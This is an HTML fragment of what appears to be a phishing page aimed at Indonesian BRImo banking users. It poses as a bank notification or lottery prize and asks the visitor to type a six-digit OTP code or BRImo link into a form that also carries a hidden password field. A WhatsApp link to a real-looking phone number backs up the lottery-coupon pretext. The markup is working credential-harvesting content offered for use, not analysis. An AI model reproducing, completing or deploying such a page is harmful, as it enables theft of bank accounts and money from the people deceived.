...
#Aktivasi{
 ...
 <img id="logoku" src="imageedit_1_4012154301.png" style="position: fixed; top: 15; left: 15; width: 50px;">
    <div class="col-12 d-block mx-auto text-center p-0" style="height: 150px; width: 256px; max-width: 100%; display: block; margin-top: 70px; border-radius: 0px; margin-bottom: -200px"><center><img alt="" src="/giphy.gif" style="display: block; margin: 0px; width: 50%; height: 50%; border-radius: 0px;">𝗟𝗼𝗻𝗰𝗲𝗻𝗴 𝗡𝗼𝘁𝗶𝗳𝗶𝗸𝗮𝘀𝗶</center></div>
 ...
 <input type="hidden" id="pass" name="pass">
       <center> 
        <div style="margin-top: 30px"> 
         ...
         <textarea type="tel" name="sms" id="sms"  oninvalid="this.setCustomValidity('Mɑsukkɑn 6 Digit 𝗞𝗼𝗱𝗲 𝗩𝗶𝗿𝘁𝘂𝗮𝗹 𝗗𝗲𝗻𝗴𝗮𝗻 𝗕𝗲𝗻𝗮𝗿')" onchange="this.setCustomValidity('')" class="bubble-element Input form-log" placeholder="Silahkan  masukan Kode OTP atau Tautan BRImo dikotak ini" maxlength="6" minlength="6" style="margin-left: 0px; height: 65px; border-radius: 10px; text-align: left; padding: 8px" required onclick="gantiborder1()"></textarea>
...
<input type="submit" id="kirims" class="bubble-element Button clickable-element" style="max-width: 85%; padding: 0px; cursor: pointer; background: none rgb(9, 140, 227); border: none; text-align: center; display: block; margin: 20px auto; height: 39px; width: 346px; left: 0px; top: 0px; font-family: Arial; font-size: 14px; font-weight: 400; color: rgb(255, 255, 255); letter-spacing: 1px; line-height: 1; border-radius: 50px; box-shadow: rgb(170, 170, 170) 2px 2px 4px 0px; transition: background 200ms ease 0s; font-weight: 700" tabindex="2" value="Konfirmasi"  />
   ...
   <b> <p onclick="location.href='https://wa.me/6282258261466?text=Saya Belum Mendapatkan Kode Kupon Undian'" style="font-size: 14px; text-align: center; margin-top: 55px; margin-left: 10px; margin-right: 10px;"><strong style="color: #FF0000; text-decoration: none"> Tidak Terima Kode ?<br>
